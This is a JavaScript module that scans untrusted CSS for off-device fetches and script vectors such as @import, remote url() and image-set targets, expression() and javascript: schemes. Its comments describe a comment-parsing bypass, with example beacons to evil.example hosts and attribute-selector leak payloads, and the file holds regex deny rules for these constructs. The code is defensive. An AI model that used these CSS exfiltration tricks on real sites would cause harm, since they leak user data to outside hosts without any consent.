/**
 * lib/core/css-scan.js — "does this stylesheet reach off the device?", answered once.
 *
 * The safety scanners two faculties need over UNTRUSTED CSS: `findCssExfil` (every
 * off-device or script-bearing construct) and `findCssImports` (every `@import` with
 * its target classified). Pure, `fs`-free, dependency-free apart from the canonical
 * comment walk, so both browser bundles hold it.
 *
 * WHY IT IS ITS OWN FILE. These were born inside `lib/layout/gate.js`, the COMPONENT
 * gate, which is the right home for everything else there — the manifest schema, the
 * selector-scoping walk, the skeleton rules. But `lib/theme/gate.js` needs exactly
 * these two and none of the rest, and reaching them through the component gate drags
 * a 41 KB JSON manifest schema and the whole component contract into the theme
 * browser bundle (measured: `theme-core.generated.js` 55.9 KB → 133.6 KB). A theme
 * gate that depends on the component faculty's schema is also just wrong about what
 * it is. Same move, same reason, as `lib/core/css-comments.mjs`: the shared answer
 * moves to where both sides can hold it (HARD RULE #15).
 *
 * ── COMMENTS ARE READ BY THE CANONICAL WALK, AND THAT IS A FIX ───────────────
 *
 * These scanners used to blank comments with `replace(/\/\*[\s\S]*?\*\//g, …)`, the
 * exact naive strip `lib/core/css-comments.mjs` exists to abolish, and it was a live
 * BYPASS rather than a tidiness point. Comments and strings are not independent
 * layers: a `/*` inside a string is not a comment, so the naive regex pairs it with
 * the next REAL closer and blanks everything between. Measured against the gate as
 * it shipped:
 *
 *     section.x::after { content: "/*" }
 *     @import url(https://evil.example/beacon.css);
 *     body { background: url(https://evil.example/leak) }
 *     /* harmless note *\/
 *
 * `gateCss(css, 'x')` returned **zero findings** — a remote `@import` and a remote
 * `url()` beacon, both invisible, in the gate that decides whether CSS reaches a
 * same-origin preview frame holding the user's BYOK key (HARD RULE #24). The walk
 * in `css-comments.mjs` tracks strings and unquoted `url(` runs, so the string's
 * `/*` is text and the two payloads are found.
 *
 * `maskCssComments` and not `stripCssComments`: masking blanks comments to spaces and
 * keeps newlines, so `result.length === css.length` and every offset still points at
 * the source byte it names.
 *
 * ── ESCAPES ARE DECODED FOR DETECTION AND MAPPED BACK FOR JUDGMENT ──────────
 *
 * A scanner that reads only the literal bytes misses `@imp\ort url(//evil)`, which
 * the BROWSER decodes and honors. So detection runs on the decoded text. But a
 * caller deciding whether some OTHER consumer will accept the same statement has to
 * judge the bytes that consumer will actually see — and `lib/theme/gate.js` learned
 * this the expensive way: it allowlisted a decoded target against a re-derived name
 * grammar, so `@import '\61 rdesia'` read as the registered theme `ardesia` and
 * passed, while the engine's resolver (which matches raw bytes) left it in place to
 * be hoisted into first position of the composed sheet as a live fetch.
 *
 * `decodeCssEscapesMapped` therefore returns the decoded text AND an index map back
 * to the source, so every finding carries `raw` — the exact source bytes of the
 * statement — and a `line` computed against the SOURCE rather than against the
 * shortened decoded copy.
 *
 * ── KNOWN LIMITATION, inherited and deliberate ──────────────────────────────
 *
 * These scan comment-blind but NOT string-blind: a decorative `content: "@import
 * url(x)"` is reported. Blanking strings is not available — it would also blank the
 * quoted `url("…")` targets `findCssExfil` must read. The failure direction is the
 * safe one (a false positive on a string nobody writes), and it is pinned by a test
 * rather than left to be rediscovered.
 */

const { maskCssComments } = require('./css-comments.mjs');

// CSS constructs that reach OFF the device or execute — an exfiltration / XSS
// channel a palette-blind component never needs, and the live hole #616 §5.1
// (T-CSS) calls out: a shared/AI component's CSS could `background:url(//evil/
// ?leak)` a beacon, or attribute-leak deck text selector-by-selector
// (`[value^="a"]{background:url(//evil/a)}`), with no script at all — defeating
// the on-device confidentiality goal. `expression()`, `-moz-binding`, and
// `javascript:`/`vbscript:` schemes are legacy script vectors. We block every
// REMOTE fetch but allow the two NON-network url() targets a designer legitimately
// needs: a `#fragment` ref (an SVG filter/clip in the same document) and an inline
// `data:` URI (an icon like the shipped agenda component's data-SVG — loaded by CSS
// in secure-static mode, it can neither script nor fetch). So the legit inline-icon
// pattern survives while every off-device request is denied.
const CSS_EXFIL_RULES = Object.freeze([
  { rule: 'css-import', re: /@import\b/gi, message: '@import fetches a remote stylesheet — not allowed (it can beacon out or load attacker CSS).' },
  { rule: 'css-expression', re: /\bexpression\s*\(/gi, message: 'CSS expression() executes script — not allowed.' },
  { rule: 'css-binding', re: /-moz-binding\b/gi, message: '-moz-binding binds script to an element — not allowed.' },
  { rule: 'css-scheme', re: /\b(?:javascript|vbscript)\s*:/gi, message: 'a javascript:/vbscript: URL is a script vector — not allowed.' },
]);
// url( "…" | '…' | …unquoted ) — capture the target with its quotes; quoted forms
// may legitimately contain the other quote or parens (the agenda data-SVG does).
const URL_RE = /url\(\s*("(?:\\.|[^"\\])*"|'(?:\\.|[^'\\])*'|[^)]*?)\s*\)/gi;
// image-set( … ) / -webkit-image-set( … ) — its bare-string form
// (`image-set("//evil" 1x)`) fetches a remote resource WITHOUT a `url()` wrapper,
// so it would slip past URL_RE. `findAddressStrings` reads those targets with a
// paren-aware walk. It used to be a lazy regex to the first `)`, which stopped at
// the `)` of an earlier `url(data:…)` or `type("image/png")` and never reached
// `"//evil" 2x` after it (measured in Chromium, 2026-10-19: it fetched).
const IMAGESET_NAME = /^(?:-webkit-)?image-set$/;
/**
 * A string a URL parser would read as a NETWORK address: a scheme, `//`, or a backslash
 * pair. Leading control characters and spaces are skipped, as a URL parser skips them.
 * The same test as `isAddressString` in `lib/core/door-attr.mjs` (the markup channel);
 * `test/unit/core/css-scan-var-address.test.js` pins the two to the same vectors.
 */
const ADDRESS_START = /^(?:(?:https?|wss?|ftp|file|blob|javascript|vbscript):|\/\/|\\\\|\\\/|\/\\)/i;
function isAddressString(v) {
  // A URL parser deletes tab, LF and CR from ANYWHERE in the input, so `ht\9 tps://x` is `https://x`
  // (the checker, 2026-10-19: Chromium fetched it). Delete them before the test, as it does.
  const u = String(v).replace(/[\t\n\r]/g, '');
  let k = 0;
  while (k < u.length && u.charCodeAt(k) <= 32) k++;
  return ADDRESS_START.test(u.slice(k));
}

/**
 * Comments blanked to spaces, newlines and offsets preserved — the canonical walk.
 * Exported because every scanner in `lib/layout/gate.js` needs the same answer, and
 * a second implementation there is what this file exists to prevent.
 */
function stripComments(css) {
  return maskCssComments(String(css || ''));
}

// The escape decoder lives in its own dependency-free module, because the ENGINE needs it
// (lib/engine/css.js) and none of these scanners: requiring this file pulled every scanner into
// the engine bundle on every route (measured 2026-10-19: +776 gzip bytes when the address walk
// landed, past getting-started's engine ceiling). Re-exported below, so this API is unchanged.
const { decodeCssEscapesMapped, decodeCssEscapes } = require('./css-escapes.js');

/**
 * A line-number lookup over one string, built once.
 *
 * The scanners here run `matchAll` and ask for a line per hit. Computing each one by
 * counting newlines from index 0 is O(n) per hit and O(n·m) per scan, which is fine
 * for a 450-line palette and is not fine for a paste: 20 000 `@import` statements
 * took **9.5 s** on this machine, in a scanner a live editor calls on every keystroke.
 * One forward pass plus a binary search per hit makes the same scan milliseconds.
 */
function lineIndexer(src) {
  const nl = [];
  for (let i = 0; i < src.length; i++) if (src[i] === '\n') nl.push(i);
  return (index) => {
    let lo = 0;
    let hi = nl.length;
    while (lo < hi) {
      const mid = (lo + hi) >> 1;
      if (nl[mid] < index) lo = mid + 1;
      else hi = mid;
    }
    return lo + 1;
  };
}

/** 1-based line number of a character offset. One-shot; use `lineIndexer` in a loop. */
function lineAt(text, index) {
  let n = 1;
  for (let i = 0; i < index && i < text.length; i++) if (text[i] === '\n') n++;
  return n;
}

/**
 * A url() target is on-device (safe) only if it's a same-document #fragment or an
 * inline data: URI — anything else is a network fetch.
 */
function urlIsLocal(raw) {
  let s = String(raw).trim();
  if ((s[0] === '"' && s.endsWith('"')) || (s[0] === "'" && s.endsWith("'"))) s = s.slice(1, -1);
  s = s.trim().toLowerCase();
  return s.startsWith('#') || s.startsWith('data:');
}

/**
 * Off-device / script-bearing CSS constructs (comments excluded): `@import`,
 * remote `url(...)`, `expression()`, `-moz-binding`, `javascript:`/`vbscript:`.
 * One finding per hit; `url(#frag)` and `url(data:…)` are on-device → not flagged.
 * Closes #616 §5.1 T-CSS (CSS exfiltration via a shared/AI component's styles).
 *
 * `line` is the SOURCE line. It used to be the line in the escape-decoded copy,
 * which is shorter, so a sheet carrying escapes reported a finding against the wrong
 * line — cosmetic, but a gate that points at the wrong line is one an author learns
 * to distrust.
 */
function findCssExfil(css) {
  // Mask comments first (so `@imp/**/ort` can't hide a keyword across a comment),
  // THEN decode CSS escapes (so `@imp\ort` / `\75rl(` can't either).
  const masked = stripComments(css);
  const { text: src, map } = decodeCssEscapesMapped(masked);
  const lineOfSource = lineIndexer(masked);
  const lineOf = (i) => lineOfSource(map[i] ?? masked.length);
  const out = [];
  for (const { rule, re, message } of CSS_EXFIL_RULES) {
    for (const m of src.matchAll(re)) out.push({ rule, message, line: lineOf(m.index) });
  }
  const remoteFinding = (target) => ({
    rule: 'css-url-remote',
    message: `url(${target}) fetches a remote resource — only inline data: URIs and #fragment refs are allowed (a remote url() can beacon deck content out).`,
  });
  for (const m of src.matchAll(URL_RE)) {
    if (!urlIsLocal(m[1])) out.push({ ...remoteFinding(m[1]), line: lineOf(m.index) });
  }
  // The bare-string channels, read from the SOURCE (the walk decodes escapes itself, and
  // the decoded copy turns `\"` into a quote that would end a string early).
  // image-set()'s bare-string targets (no url() wrapper) — a second remote channel.
  for (const a of findAddressStrings(masked)) {
    if (a.kind === 'image-set') {
      if (!urlIsLocal(a.value)) out.push({ ...remoteFinding(a.value), line: lineOfSource(a.index) });
    } else {
      out.push({
        rule: 'css-var-address', line: lineOfSource(a.index),
        message: `"${a.value}" is an address held in ${a.where}, and any \`image-set(var(…))\` that reads it fetches it — only inline data: URIs and #fragment refs are allowed.`,
      });
    }
  }
  return out;
}

/** One escape at `s[i] === '\\'`, decoded as the CSS tokenizer decodes it: `[text, nextIndex]`. */
function readEscape(s, i) {
  const hex = /^\\([0-9a-fA-F]{1,6})[ \t\n\r\f]?/.exec(s.slice(i, i + 9));
  if (hex) {
    const cp = parseInt(hex[1], 16);
    return [cp > 0 && cp <= 0x10ffff && !(cp >= 0xd800 && cp <= 0xdfff) ? String.fromCodePoint(cp) : '\uFFFD', i + hex[0].length];
  }
  if (s[i + 1] === '\n') return ['', i + 2]; // a line continuation, inside a string
  return [s[i + 1] ?? '', i + 2];
}

/**
 * Every quoted string in a COMMENT-MASKED sheet that a browser may fetch, by a walk that
 * tracks strings, nested functions and the declaration it is in (escapes decoded as the
 * tokenizer decodes them, so `\2d-q` is `--q`):
 *
 *   kind 'image-set'  a bare string target anywhere inside `image-set()`, however deep
 *                     (not one inside `url()`, which URL_RE reports, nor `type()`, a MIME type).
 *   kind 'var'        an ADDRESS-SHAPED string in a custom property's value or an
 *                     `@property` rule's `initial-value`. A string there is text until
 *                     something reads it where an address goes, and
 *                     `--q:"https://x/y"; background-image: image-set(var(--q) 1x)` fetches
 *                     it — on another rule, through inheritance, from any element (the red team,
 *                     2026-10-18; `engineering/decisions/2026-10-16-npm-plugin-threat-model.md §5.2`).
 *                     No look at the declaration can tell whether it will be read, so the
 *                     address shape is the test. A label (`--sep:"/"`, `--t:"10:30"`) is text.
 *
 * Each item is `{ kind, value, index, where? }`, `index` an offset into the input.
 */
/** A character an identifier may hold: ASCII letters, digits, `_`, `-`, an escape, or any non-ASCII. */
const isNameChar = (c) => /[A-Za-z0-9_\\-]/.test(c) || c.charCodeAt(0) > 0x7f;

function findAddressStrings(src) {
  // CSS's preprocessing first: CRLF, a lone CR and FF are each one newline before the tokenizer
  // runs. Skipping it let a bare CR end a string for the browser and not for this walk, which then
  // read the next custom property as text (the checker, 2026-10-19). `at[k]` maps back to `src`.
  let s = '';
  const at = [];
  for (let k = 0; k < src.length; k++) {
    const c = src[k];
    if (c === '\r' && src[k + 1] === '\n') continue; // the LF that follows stands for both
    s += c === '\r' || c === '\f' ? '\n' : c;
    at.push(k);
  }
  const out = [];
  const fns = []; // the open functions, innermost last, lowercased
  // How many open functions are image-set: a count, not a scan of `fns` per string, which was
  // quadratic on `(` repeated (29 s on 160 KB, the checker).
  let imageSets = 0;
  let prop = ''; // the declaration (or descriptor) a value belongs to, '' outside one
  let i = 0;
  const readName = () => {
    let name = '';
    while (i < s.length && isNameChar(s[i])) {
      if (s[i] === '\\') {
        if (s[i + 1] === '\n' || s[i + 1] == null) break;
        const [d, n] = readEscape(s, i);
        name += d;
        i = n;
      } else name += s[i++];
    }
    return name;
  };
  while (i < s.length) {
    const c = s[i];
    if (c === '"' || c === "'") {
      const start = i;
      let v = '';
      i++;
      while (i < s.length && s[i] !== c && s[i] !== '\n') {
        if (s[i] === '\\') {
          const [d, n] = readEscape(s, i);
          v += d;
          i = n;
        } else v += s[i++];
      }
      i++;
      const inner = fns[fns.length - 1];
      if (inner === 'url') {
        // A url("…") target is URL_RE's to report, wherever it sits.
      } else if (inner !== 'type' && imageSets > 0) out.push({ kind: 'image-set', value: v, index: at[start] });
      else if ((prop.startsWith('--') || prop === 'initial-value') && isAddressString(v)) {
        out.push({ kind: 'var', value: v.trim(), index: at[start], where: prop === 'initial-value' ? 'an `@property` initial-value' : `the custom property \`${prop}\`` });
      }
    } else if (c === ';' || c === '{' || c === '}') {
      if (fns.length === 0) prop = '';
      i++;
    } else if (c === '(') {
      fns.push('');
      i++;
    } else if (c === ')') {
      if (IMAGESET_NAME.test(fns.pop() ?? '')) imageSets--;
      i++;
    } else if (isNameChar(c) && !/[0-9]/.test(c)) {
      const name = readName();
      if (!name) {
        i++;
        continue;
      }
      if (s[i] === '(') {
        const fn = name.toLowerCase();
        i++;
        if (fn === 'url') {
          // An unquoted url( … ) run is one token: skip it, so nothing in it reads as a string. URL_RE reports it.
          let k = i;
          while (/[ \t\n\r\f]/.test(s[k] ?? '')) k++;
          if (s[k] !== '"' && s[k] !== "'") {
            while (i < s.length && s[i] !== ')') i += s[i] === '\\' ? 2 : 1;
            i++;
            continue;
          }
        }
        fns.push(fn);
        if (IMAGESET_NAME.test(fn)) imageSets++;
      } else if (fns.length === 0) {
        let k = i;
        while (/[ \t\n\r\f]/.test(s[k] ?? '')) k++;
        if (s[k] === ':') prop = name.startsWith('--') ? name : name.toLowerCase();
      }
    } else i++;
  }
  return out;
}

// `@import` as a KEYWORD — the same token `CSS_EXFIL_RULES[0]` bans outright for a
// component. A theme cannot be held to that ban (every shipped palette opens with
// `@import 'lattice'`), so the theme gate needs to read each import's TARGET rather
// than only count the keyword. See `findCssImports` and `lib/theme/gate.js`.
const IMPORT_AT_RE = /@import\b/gi;
// A quoted string, the two forms an `@import` target may take. Unterminated → no
// match, which classifies the import as `other` and (in every caller here) rejects
// it: an author mid-keystroke is not a reason to certify a target nobody could read.
const IMPORT_STRING_RE = /^("(?:\\.|[^"\\])*"|'(?:\\.|[^'\\])*')/;
// `url( … )` at the head of an import body, quoted or bare — mirrors URL_RE's target
// capture so the two agree on what a `url()` target is.
const IMPORT_URL_RE = /^url\(\s*("(?:\\.|[^"\\])*"|'(?:\\.|[^'\\])*'|[^)]*?)\s*\)/i;
/**
 * How far past `@import` the statement scan will look for a terminator.
 *
 * A malformed import — an unterminated quote, an unbalanced `(` — has no terminator
 * to find, so the scan runs to end-of-input, once per `@import` in the sheet. That is
 * quadratic on attacker-chosen bytes and it is synchronous in a browser tab:
 * `'@import "'.repeat(20000)` took **17 s**, measured, in a scanner the CSS view calls
 * on every keystroke and the `.zip` import path feeds untrusted bytes to.
 *
 * Capping it costs nothing real. A theme-name import is ~30 bytes; the longest thing
 * this needs to classify correctly is a `url(data:…)` target, which every caller
 * rejects anyway. Past the cap the statement is cut, which yields an unterminated —
 * therefore `other`, therefore rejected — classification: the safe direction.
 */
const MAX_IMPORT_STATEMENT = 4096;

/**
 * Split an `@import` body into its TARGET and the TAIL that follows it.
 *
 * `kind` is `'url'` (a `url(…)` target), `'string'` (a quoted target) or `'other'`
 * (anything else, including an unterminated string). `tail` is everything between
 * the target and the statement's end — a layer(), supports() or media-query
 * qualifier. It is reported rather than parsed because the engine's two theme-import
 * grammars (`THEME_IMPORT_RE` in lib/engine/css.js, `THEME_NAME_IMPORT_RE` in
 * lib/engine/themes.js) both end at the closing quote: an import carrying a tail
 * does NOT resolve against the theme registry, so a caller allowlisting registered
 * theme names has to see that the tail is there.
 */
function classifyImportTarget(body) {
  const rest = String(body).trimStart();
  const url = IMPORT_URL_RE.exec(rest);
  if (url) {
    let t = url[1].trim();
    if ((t[0] === '"' && t.endsWith('"')) || (t[0] === "'" && t.endsWith("'"))) t = t.slice(1, -1);
    return { kind: 'url', target: t.trim(), quote: '', tail: rest.slice(url[0].length).trim() };
  }
  const str = IMPORT_STRING_RE.exec(rest);
  if (str) {
    return { kind: 'string', target: str[1].slice(1, -1), quote: str[1][0], tail: rest.slice(str[0].length).trim() };
  }
  return { kind: 'other', target: rest.trim(), quote: '', tail: '' };
}

/**
 * Every `@import` statement in the CSS, with its target classified.
 *
 * DETECTION IS BROWSER-SHAPED: comments masked, escapes decoded, keyword matched
 * case-insensitively — so everything a browser would honor is found, including
 * `@imp\ort` and `@IMPORT`. JUDGMENT IS CALLER-SHAPED: each finding carries `raw`,
 * the exact SOURCE bytes of the statement, so a caller can decide against the bytes
 * whatever consumer it cares about will actually read. The two are different
 * questions and conflating them is how an escaped theme name passed a gate whose
 * whole purpose was to reject it (see the module header).
 *
 * The statement ends at the first top-level `;`, `{` or `}`, with strings and `()`
 * nesting transparent, so a `;` inside `url("a;b")` does not end it early — or at
 * `MAX_IMPORT_STATEMENT` bytes, whichever comes first.
 *
 * WHY THIS IS A PRIMITIVE AND NOT A RULE. For a component the answer is settled —
 * `CSS_EXFIL_RULES[0]` bans `@import` outright, because a component never needs
 * one. A THEME is the opposite: the import is how a palette inherits, it is in
 * 32 of 32 shipped themes, and it is the entire token content of 13 of them. So
 * the theme gate has to allowlist a target rather than ban a keyword, and this is
 * the reading that lets it. One finding per hit; NOTHING here decides policy.
 */
function findCssImports(css) {
  const masked = stripComments(css);
  const { text: src, map } = decodeCssEscapesMapped(masked);
  const lineOfSource = lineIndexer(masked);
  const srcAt = (i) => map[i] ?? masked.length;
  const out = [];
  for (const m of src.matchAll(IMPORT_AT_RE)) {
    const start = m.index;
    const limit = Math.min(src.length, start + MAX_IMPORT_STATEMENT);
    let i = start + m[0].length;
    let depth = 0;
    let quote = '';
    for (; i < limit; i++) {
      const ch = src[i];
      if (quote) {
        if (ch === '\\') i++;
        else if (ch === quote) quote = '';
        continue;
      }
      if (ch === '"' || ch === "'") { quote = ch; continue; }
      if (ch === '(' || ch === '[') depth++;
      // Clamped at zero for the same reason `splitSelectorList` clamps: an unbalanced
      // `)` mid-edit must not make every later `;` invisible, swallowing the rest of
      // the sheet into one import statement.
      else if (ch === ')' || ch === ']') depth = Math.max(0, depth - 1);
      else if (depth === 0 && (ch === ';' || ch === '{' || ch === '}')) break;
    }
    out.push({
      ...classifyImportTarget(src.slice(start + m[0].length, i)),
      line: lineOfSource(srcAt(start)),
      index: srcAt(start),
      // The SOURCE bytes, un-decoded — what any other consumer of this stylesheet
      // will read. `statement` is the decoded reading the classification came from.
      raw: masked.slice(srcAt(start), srcAt(i)).trim(),
      statement: src.slice(start, i).trim(),
    });
  }
  return out;
}

module.exports = {
  CSS_EXFIL_RULES,
  findAddressStrings,
  isAddressString,
  MAX_IMPORT_STATEMENT,
  stripComments,
  decodeCssEscapes,
  decodeCssEscapesMapped,
  lineAt,
  lineIndexer,
  urlIsLocal,
  findCssExfil,
  findCssImports,
  classifyImportTarget,
};
